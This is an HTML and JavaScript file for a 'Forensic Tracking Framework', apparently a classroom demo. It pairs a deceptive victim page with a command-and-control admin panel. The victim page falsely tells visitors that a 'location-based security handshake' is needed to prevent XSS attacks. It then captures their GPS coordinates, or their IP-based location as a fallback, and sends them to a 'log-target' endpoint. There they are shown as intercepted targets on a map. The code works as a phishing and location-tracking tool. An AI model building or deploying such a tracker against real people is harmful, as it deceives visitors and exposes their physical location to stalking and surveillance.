<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Forensic Tracking Framework</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&display=swap');
        body { font-family: 'JetBrains+Mono', monospace; background-color: #050505; color: #00ff41; }
        .cyber-border { border: 1px solid #1a1a1a; }
        .admin-panel { display: none; }
        #map { height: 400px; width: 100%; border: 1px solid #00ff41; filter: invert(100%) hue-rotate(180deg) brightness(0.8); }
        .tab-btn.active { background: #00ff41; color: black; }
    </style>
</head>
<body class="p-4">

    <!-- Navigation Switcher (Only for Dev/Presentation) -->
    <div class="max-w-6xl mx-auto mb-8 flex gap-4 border-b border-gray-800 pb-4">
        <button onclick="showView('target')" id="targetBtn" class="tab-btn active px-4 py-2 text-xs border border-green-500">VIEW: VICTIM PAGE</button>
        <button onclick="showView('admin')" id="adminBtn" class="tab-btn px-4 py-2 text-xs border border-green-500">VIEW: ADMIN C2 PANEL</button>
    </div>

    <!-- ========================================== -->
    <!-- TARGET INTERFACE (What the victim sees)     -->
    <!-- ========================================== -->
    <div id="targetView" class="max-w-2xl mx-auto mt-10">
        <div class="bg-zinc-900 p-8 rounded-lg cyber-border text-center shadow-2xl">
            <div class="mb-6">
                <svg class="w-16 h-16 mx-auto text-blue-500" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04M12 21.355r1.104-1.312a12.022 12.022 0 01-2.208 0L12 21.355z"></path></svg>
            </div>
            <h1 class="text-xl text-white font-bold mb-2">Security Certificate Required</h1>
            <p class="text-gray-400 text-sm mb-6">Your connection requires a mandatory location-based security handshake to prevent cross-site scripting (XSS) attacks. Please allow permissions when prompted.</p>
            
            <button id="handshakeBtn" class="bg-blue-600 hover:bg-blue-700 text-white px-8 py-3 rounded font-bold transition-all">
                Validate Security & Proceed
            </button>
            
            <div id="targetStatus" class="mt-4 text-[10px] text-gray-600 uppercase italic">Awaiting connection...</div>
        </div>
    </div>

    <!-- ========================================== -->
    <!-- ADMIN INTERFACE (What the professor sees)  -->
    <!-- ========================================== -->
    <div id="adminView" class="admin-panel max-w-7xl mx-auto">
        <div class="grid grid-cols-1 lg:grid-cols-3 gap-6">
            
            <!-- Left: Logs Table -->
            <div class="lg:col-span-2 space-y-6">
                <div class="bg-zinc-900 p-6 rounded border border-gray-800">
                    <h2 class="text-sm font-bold mb-4 flex items-center gap-2">
                        <span class="w-2 h-2 bg-red-500 rounded-full animate-pulse"></span>
                        INTERCEPTED TARGETS_LOG
                    </h2>
                    <div class="overflow-x-auto">
                        <table class="w-full text-left text-xs">
                            <thead class="bg-black text-gray-500 uppercase">
                                <tr>
                                    <th class="p-3">Timestamp</th>
                                    <th class="p-3">IP Address</th>
                                    <th class="p-3">Method</th>
                                    <th class="p-3">Coordinates</th>
                                    <th class="p-3">Location</th>
                                    <th class="p-3">Action</th>
                                </tr>
                            </thead>
                            <tbody id="logTable">
                                <!-- Data populated via JS -->
                            </tbody>
                        </table>
                    </div>
                </div>
            </div>

            <!-- Right: Real-time Map -->
            <div class="lg:col-span-1 space-y-6">
                <div class="bg-zinc-900 p-4 rounded border border-gray-800">
                    <h2 class="text-xs font-bold mb-2 uppercase text-gray-500">Live Asset Tracking</h2>
                    <div id="map"></div>
                </div>
                
                <div class="bg-black p-4 rounded border border-red-900/30">
                    <h2 class="text-[10px] font-bold text-red-500 uppercase mb-2">Forensic Intelligence</h2>
                    <p class="text-[10px] text-gray-500 leading-tight">
                        Passive nodes are inferred using BGP peering data. GPS locks provide ±5m precision via HTML5 Geolocation API. Check ISP routing headers for VPN detection.
                    </p>
                </div>
            </div>
        </div>
    </div>

    <script>
        const API_BASE = "http://127.0.0.1:8000";
        let map = L.map('map').setView([20, 0], 2);
        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
        let markers = [];

        // --- View Switching ---
        function showView(view) {
            document.getElementById('targetView').style.display = view === 'target' ? 'block' : 'none';
            document.getElementById('adminView').style.display = view === 'admin' ? 'block' : 'none';
            document.getElementById('targetBtn').classList.toggle('active', view === 'target');
            document.getElementById('adminBtn').classList.toggle('active', view === 'admin');
            if(view === 'admin') refreshAdminLogs();
        }

        // --- Target Logic (The "Victim") ---
        document.getElementById('handshakeBtn').addEventListener('click', () => {
            const status = document.getElementById('targetStatus');
            status.innerText = "Initiating Security Handshake...";

            navigator.geolocation.getCurrentPosition(
                async (pos) => {
                    const ipData = await fetch(`${API_BASE}/track-ip`).then(r => r.json());
                    await sendToC2({
                        latitude: pos.coords.latitude,
                        longitude: pos.coords.longitude,
                        method: "GPS High Accuracy",
                        accuracy: `±${pos.coords.accuracy.toFixed(1)}m`,
                        ip: ipData.query || "Inferred",
                        city: ipData.city || "Unknown",
                        country: ipData.country || "Unknown"
                    });
                    status.innerText = "Validation Complete. Redirecting...";
                },
                async (err) => {
                    status.innerText = "GPS Blocked. Attempting Network Failover...";
                    const ipData = await fetch(`${API_BASE}/track-ip`).then(r => r.json());
                    await sendToC2({
                        latitude: ipData.lat,
                        longitude: ipData.lon,
                        method: "Network Inference",
                        accuracy: "±5-10km",
                        ip: ipData.query || "Unknown",
                        city: ipData.city || "Unknown",
                        country: ipData.country || "Unknown"
                    });
                    status.innerText = "Validation Complete (Legacy Mode). Proceeding...";
                },
                { timeout: 5000 }
            );
        });

        async function sendToC2(payload) {
            await fetch(`${API_BASE}/log-target`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
        }

        // --- Admin Logic ---
        async function refreshAdminLogs() {
            const res = await fetch(`${API_BASE}/get-all-targets`);
            const data = await res.json();
            const table = document.getElementById('logTable');
            table.innerHTML = "";
            
            // Clear markers
            markers.forEach(m => m.remove());
            markers = [];

            data.forEach((entry, index) => {
                const row = `
                    <tr class="border-b border-gray-800 hover:bg-white/5 transition-colors">
                        <td class="p-3 text-gray-400">${entry.timestamp}</td>
                        <td class="p-3 text-blue-400">${entry.ip}</td>
                        <td class="p-3">${entry.method}</td>
                        <td class="p-3 text-green-500">${entry.latitude.toFixed(3)}, ${entry.longitude.toFixed(3)}</td>
                        <td class="p-3 text-gray-400">${entry.city}, ${entry.country}</td>
                        <td class="p-3">
                            <button onclick="focusMap(${entry.latitude}, ${entry.longitude})" class="text-[10px] underline text-blue-500">PINPOINT</button>
                        </td>
                    </tr>
                `;
                table.innerHTML += row;

                // Add to map
                const m = L.marker([entry.latitude, entry.longitude]).addTo(map)
                    .bindPopup(`<b>Target #${index+1}</b><br>${entry.method}<br>${entry.ip}`);
                markers.push(m);
            });
        }

        function focusMap(lat, lon) {
            map.setView([lat, lon], 14);
        }

        // Auto-refresh admin logs every 10 seconds if on admin view
        setInterval(() => {
            if (document.getElementById('adminView').style.display === 'block') {
                refreshAdminLogs();
            }
        }, 10000);
    </script>
</body>
</html>